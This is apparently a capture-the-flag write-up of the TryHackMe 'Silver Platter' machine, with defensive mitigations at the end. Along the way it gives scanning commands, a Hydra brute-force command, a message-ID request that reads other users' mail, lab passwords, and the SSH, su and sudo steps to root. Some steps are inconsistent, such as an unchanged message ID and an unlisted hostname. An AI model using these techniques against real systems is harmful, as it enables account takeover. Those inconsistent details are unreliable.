# Silver Platter - TryHackMe Writeup

## Basic Information

| Category | Details |
|----------|----------|
| Platform | TryHackMe |
| Machine Name | Silver Platter |
| Difficulty | Easy |
| Operating System | Linux |
| Target IP | 10.49.157.115 |

---

# Introduction

Today we are back with another TryHackMe challenge, an **Easy Linux** machine named **Silver Platter**.

The provided scenario states that we must compromise the infrastructure of **Hack Smarter Security**, discover both flags, and demonstrate how an attacker could successfully penetrate the environment despite the defensive mechanisms implemented by the organization.

Unlike many beginner machines, Silver Platter combines several realistic attack paths including:

- Web Enumeration
- Virtual Host Discovery
- Credential Harvesting
- Password Attacks
- Authentication Bypass
- SSH Access
- Credential Reuse
- Privilege Escalation

This room focuses more on proper enumeration than complicated exploitation. Almost every important step is hinted at somewhere on the machine, rewarding careful observation instead of random guessing.

---

# Scenario

> Think you've got what it takes to outsmart the Hack Smarter Security team? They claim to be unbeatable, and now it's your chance to prove them wrong.

The objective is simple:

- Obtain the initial foothold
- Capture User Flag
- Escalate privileges
- Capture Root Flag

---

# Attack Methodology

The attack followed the methodology below.

```
Reconnaissance
        │
        ▼
Port Enumeration
        │
        ▼
Service Enumeration
        │
        ▼
Website Analysis
        │
        ▼
Directory Enumeration
        │
        ▼
Virtual Host Discovery
        │
        ▼
Silverpeas Login Portal
        │
        ▼
Password Attack
        │
        ▼
Authentication Bypass
        │
        ▼
Credential Disclosure
        │
        ▼
SSH Access
        │
        ▼
Credential Reuse
        │
        ▼
Privilege Escalation
        │
        ▼
Root
```

---

# Initial Reconnaissance

As always, the very first step is discovering what services are exposed.

A complete TCP scan is performed.

```bash
nmap -p- 10.49.157.115
```

## Result

```
22/tcp
80/tcp
8080/tcp
```

Only three ports are open.

- SSH
- HTTP
- HTTP (Alternate)

Since only a handful of services are available, each one deserves detailed investigation.

---

# Service Enumeration

Next, a version detection scan is executed.

```bash
nmap -sC -sV 10.49.157.115
```

Result:

```
22/tcp   OpenSSH 8.9p1 Ubuntu
80/tcp   nginx 1.18.0
8080/tcp HTTP Service
```

Important observations include:

- Modern OpenSSH version
- Nginx web server
- Additional web application running on port 8080

The alternate HTTP service is particularly interesting because many applications expose administrative interfaces or internal software on non-standard ports.

---

# Website Enumeration

Opening port **80** reveals the official webpage for **Hack Smarter Security**.

The website appears fairly simple.

Browsing through each page reveals standard company information including:

- Home
- About
- Contact

No obvious vulnerabilities are immediately visible.

Instead of rushing into exploitation, every page should be reviewed carefully.

---

# Interesting Discovery

The **Contact** section contains an extremely valuable piece of information.

```
Project Manager

Username:

scr1ptkiddy
```

Although this may appear insignificant, usernames frequently become useful later during authentication attacks.

At this point we now possess:

```
Username

scr1ptkiddy
```

No password yet.

---

# Investigating Port 8080

Opening

```
http://10.49.157.115:8080
```

returns only

```
404 Not Found
```

Many beginners stop here.

However, a 404 response usually indicates that:

- Web server is functioning
- Default document does not exist
- Hidden directories may still exist

Therefore directory enumeration becomes the next logical step.

---

# Directory Enumeration

Gobuster is used against port 80.

```bash
gobuster dir \
-u http://10.49.157.115 \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

Interesting findings:

```
/images
/assets
/LICENSE.txt
/README.txt
```

These directories contain only static resources.

No administrative panels or login pages are exposed.

---

# Directory Enumeration on Port 8080

The second web service is far more interesting.

```bash
gobuster dir \
-u http://10.49.157.115:8080 \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

Results:

```
/website
/console
/weblib
```

Immediately this suggests an application framework rather than a simple website.

Unfortunately, directly browsing these endpoints still does not provide access to the application.

Further investigation is required.

---

# Hostname Enumeration

Sometimes applications rely on virtual hosts instead of IP addresses.

Checking the local hosts file confirms this suspicion.

```
10.49.157.115 silverplatter.thm
```

Adding the hostname allows proper interaction with the application.

```
10.49.157.115 silverplatter.thm
```

After updating `/etc/hosts`, the site behaves more consistently.

---

# Searching for Hidden Virtual Hosts

Since directory brute forcing has not revealed the expected application, another possibility is that additional virtual hosts exist.

Subdomain enumeration is attempted.

Several techniques are tested.

- Gobuster VHOST
- Manual guessing
- DNS enumeration

Unfortunately, none of these reveal anything useful.

This demonstrates an important lesson during penetration testing:

> Enumeration is rarely linear.

When one technique fails, another source of information should be examined.

---

# Revisiting the Website

Returning to the contact page reveals something previously overlooked.

The project manager is associated with

```
Silverpeas
```

rather than simply being an employee.

This strongly suggests that **Silverpeas** is likely an application name rather than a person's role.

Knowing that port **8080** hosts another web application, combining these clues leads to a likely URL.

```
http://silverpeas.thm:8080/silverpeas
```

---

# Discovering the Login Portal

Browsing to

```
http://silverpeas.thm:8080/silverpeas
```

finally reveals a login page.

At this point we possess:

- Valid username
- Login portal
- No password

The attack surface has changed dramatically.

Instead of discovering the application, the focus now shifts toward obtaining valid credentials.

---

# Building a Custom Wordlist

Rather than immediately using massive password dictionaries, a smarter approach is to generate a targeted wordlist from the website itself.

The **CeWL** tool crawls a website and extracts meaningful words that are likely to have been chosen by administrators.

Command:

```bash
cewl http://silverplatter.thm > passwords.txt
```

Advantages include:

- Smaller wordlist
- Context-aware passwords
- Faster brute-force attacks
- Higher success rate

This technique often succeeds against organizations where employees choose passwords related to internal projects or company terminology.

---

# Password Brute Force

Hydra is used against the authentication endpoint.

```bash
hydra \
-l scr1ptkiddy \
-P passwords.txt \
silverpeas.thm \
-s 8080 \
http-post-form \
"/silverpeas/AuthenticationServlet:Login=^USER^&Password=^PASS^&DomainId=0:F=Login or password incorrect"
```

Hydra successfully discovers valid credentials.

```
Username:

scr1ptkiddy

Password:

adipiscing
```

This confirms that the password policy was insufficient to resist even a targeted dictionary attack.

Instead of requiring a random high-entropy password, the account used a predictable dictionary word extracted directly from the organization's own website.

---

# Initial Access to Silverpeas

Using the recovered credentials, authentication succeeds and access to the Silverpeas portal is obtained.

At first glance, the application appears to contain:

- Internal messaging
- User profiles
- Administrative functionality
- Company collaboration features

Rather than immediately searching for sensitive information manually, the next step is identifying known vulnerabilities affecting the specific version of Silverpeas.

This ultimately leads to the vulnerability that provides the foothold into the operating system.

---

# End of Part 1

In this part we successfully:

- Enumerated all open ports
- Identified exposed services
- Inspected the public website
- Discovered the `scr1ptkiddy` username
- Enumerated hidden directories
- Identified the Silverpeas application
- Built a custom password list using CeWL
- Successfully brute-forced valid credentials
- Logged into the internal Silverpeas portal

The next part focuses on exploiting a Silverpeas authentication bypass vulnerability, obtaining SSH credentials, capturing the user flag, performing privilege escalation through credential reuse, and finally compromising the root account.

# Exploiting Silverpeas

After successfully authenticating to the Silverpeas portal, the next objective is to identify vulnerabilities that may allow access to sensitive information or provide a path to the underlying operating system.

Since Silverpeas is an open-source collaboration platform, checking for publicly disclosed vulnerabilities is a logical next step.

Researching the application reveals an authentication bypass issue affecting certain versions of Silverpeas.

Reference:

```
https://github.com/Silverpeas/Silverpeas-Core/commit/11fb5e21c252ce4751b85fccf5b8076156e0b4f0
```

The vulnerability affects the internal messaging functionality and allows an authenticated user to bypass normal authorization checks when requesting specific resources.

Instead of validating whether the authenticated user owns the requested message, the application only checks whether the user is logged in.

As a result, modifying the request allows arbitrary messages belonging to other users to be viewed.

---

# Understanding the Vulnerability

After intercepting one of the requests inside Burp Suite, the request appears similar to the following.

```http
GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6 HTTP/1.1
Host: silverpeas.thm:8080
Cookie: JSESSIONID=<session>
```

Normally the application should verify:

- Message ownership
- User authorization
- Session permissions

Instead, it only verifies the existence of a valid authenticated session.

Changing only the message ID exposes another user's mailbox.

This is a classic example of **Broken Access Control (BAC)** where authorization is either missing or implemented incorrectly.

---

# Reading Another User's Mail

Changing the request to:

```http
GET /silverpeas/RSILVERMAIL/jsp/ReadMessage.jsp?ID=6
```

returns a completely different user's email.

Inside the message we discover highly sensitive information.

```
Username:
tim

Password:
cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

This is an extremely common security failure.

Instead of sending users temporary links or password reset tokens, administrators often transmit passwords directly through internal messaging systems.

Even worse, the password is stored in plaintext.

At this point we have successfully obtained valid operating system credentials.

---

# Initial Foothold

Rather than continuing through the web application, the newly recovered credentials are tested against SSH.

```bash
ssh tim@10.49.157.115
```

Password:

```
cm0nt!md0ntf0rg3tth!spa$$w0rdagainlol
```

Authentication succeeds immediately.

We now possess an interactive shell on the target system.

---

# User Enumeration

Checking the current user.

```bash
whoami
```

Output

```
tim
```

Checking the current working directory.

```bash
pwd
```

Listing files.

```bash
ls
```

Output

```
user.txt
```

Reading the flag.

```bash
cat user.txt
```

Result

```
THM{c4ca4238a0b923820dcc509a6f75849b}
```

The first objective has now been completed.

---

# Local Enumeration

Privilege escalation always begins with local enumeration.

Checking existing users.

```bash
cat /etc/passwd | tail
```

Interesting output:

```
tyler
tim
ubuntu
```

The presence of another regular user account often indicates a possible privilege escalation path.

Attempting to access Tyler's home directory is unsuccessful because of insufficient permissions.

Further investigation is required.

---

# Searching for Credentials

Rather than immediately searching for SUID binaries or kernel exploits, the filesystem is inspected for interesting files.

Log files frequently contain forgotten credentials, command histories or administrator mistakes.

Moving into the log directory.

```bash
cd /var/log
```

Searching through logs eventually reveals an interesting entry.

```
COMMAND=/usr/bin/docker run \
-e POSTGRES_PASSWORD=_Zd_zx7N823/
```

Another log contains the same value.

```
_Zd_zx7N823/
```

This appears to be the password supplied to a PostgreSQL Docker container.

---

# Credential Reuse

A common mistake within real organizations is password reuse.

Administrators often reuse passwords across:

- Databases
- Linux accounts
- SSH
- Internal applications

Since another user named **tyler** exists, the recovered password is tested.

```bash
su tyler
```

Password

```
_Zd_zx7N823/
```

Authentication succeeds.

We have now successfully moved laterally from:

```
tim

↓

tyler
```

without exploiting any software vulnerability.

This is entirely the result of poor credential management.

---

# Privilege Escalation

Now operating as Tyler, the first step is checking sudo permissions.

```bash
sudo -l
```

Output

```
User tyler may run the following commands:

(ALL : ALL) ALL
```

This is the best possible result during privilege escalation.

Tyler is allowed to execute every command as root.

Obtaining a root shell is therefore trivial.

```bash
sudo su
```

Current user:

```bash
whoami
```

Output

```
root
```

The machine has now been fully compromised.

---

# Root Flag

Navigating to the root directory.

```bash
cd /root
```

Listing files.

```bash
ls
```

Output

```
root.txt
```

Reading the flag.

```bash
cat root.txt
```

Result

```
THM{098f6bcd4621d373cade4e832627b4f6}
```

Root access has been successfully achieved.

---

# Attack Path Summary

```
Internet
     │
     ▼
Nmap Enumeration
     │
     ▼
Website Enumeration
     │
     ▼
Username Discovery
     │
     ▼
Directory Enumeration
     │
     ▼
Silverpeas Portal
     │
     ▼
CeWL Password List
     │
     ▼
Hydra Password Attack
     │
     ▼
Silverpeas Login
     │
     ▼
Authentication Bypass
     │
     ▼
Read Internal Messages
     │
     ▼
SSH Credentials
     │
     ▼
SSH Login as tim
     │
     ▼
Log File Enumeration
     │
     ▼
Credential Reuse
     │
     ▼
su tyler
     │
     ▼
sudo -l
     │
     ▼
sudo su
     │
     ▼
Root
```

---

# Security Weaknesses Identified

## 1. Information Disclosure

The public website leaked a valid internal username.

Impact:

- Facilitated password attacks.
- Reduced attacker guessing effort.

Mitigation:

- Avoid publishing internal usernames.
- Use generic contact forms instead.

---

## 2. Weak Password Selection

The password was derived from content available on the organization's own website.

Impact:

- Easily cracked using CeWL.

Mitigation:

- Enforce high-entropy passwords.
- Block dictionary-based passwords.
- Require password managers.

---

## 3. Broken Access Control

Silverpeas allowed authenticated users to read messages belonging to other users.

Impact:

- Disclosure of sensitive information.
- Credential compromise.

Mitigation:

- Perform authorization checks on every object request.
- Follow the principle of least privilege.
- Implement server-side ownership validation.

---

## 4. Plaintext Credential Storage

User passwords were transmitted through internal messaging.

Impact:

- Complete account compromise.

Mitigation:

- Never send passwords through email or messaging.
- Use password reset workflows.
- Store only password hashes.

---

## 5. Credential Reuse

Database credentials were reused as Linux account passwords.

Impact:

- Immediate lateral movement.

Mitigation:

- Use unique credentials for every service.
- Rotate passwords regularly.
- Implement privileged access management.

---

## 6. Excessive sudo Privileges

The Tyler account possessed unrestricted sudo permissions.

Impact:

- Instant root compromise.

Mitigation:

- Apply least privilege.
- Limit sudo access to required administrative commands only.

---

# Lessons Learned

This machine demonstrates that successful penetration testing is rarely about exploiting highly advanced vulnerabilities.

Instead, compromise resulted from several small weaknesses chained together:

- Public information disclosure.
- Weak password hygiene.
- Predictable password selection.
- Broken access control.
- Plaintext credential storage.
- Password reuse.
- Excessive privilege assignment.

Each issue alone may have appeared relatively minor, but together they resulted in complete system compromise.

This highlights one of the most important concepts in offensive security:

> Attackers rarely rely on a single vulnerability. Instead, they chain multiple low and medium severity weaknesses together until full system compromise becomes possible.

---

# Conclusion

Silver Platter is an excellent beginner-friendly machine that introduces realistic penetration testing techniques while emphasizing the importance of thorough enumeration and logical attack progression.

The exploitation chain begins with careful observation of publicly available information, continues through targeted password attacks and a Broken Access Control vulnerability within the Silverpeas application, and culminates in operating system compromise through credential reuse and excessive sudo privileges.

From a defensive perspective, this machine reinforces several critical security principles:

- Never expose unnecessary internal information.
- Enforce strong password policies.
- Validate authorization on every request.
- Never store or transmit plaintext credentials.
- Prevent password reuse across services.
- Grant administrative privileges only when absolutely necessary.

Overall, Silver Platter effectively demonstrates how multiple seemingly minor security weaknesses can be combined into a complete compromise, making it an excellent room for developing enumeration skills, web application assessment techniques, and Linux privilege escalation fundamentals.
